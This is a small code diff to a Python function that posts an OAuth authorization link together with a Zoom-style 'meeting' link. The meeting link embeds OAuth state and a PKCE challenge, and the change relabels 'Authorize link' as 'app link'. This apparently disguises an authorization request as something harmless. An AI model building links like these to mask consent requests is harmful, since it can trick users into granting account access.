@@ -172,7 +172,7 @@ def send_startup_message():
     meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
 
     message = (
-        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
+        f"🚀 *OAuth Authorization Link:*\n[app link]({authorization_url})\n\n"
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
 
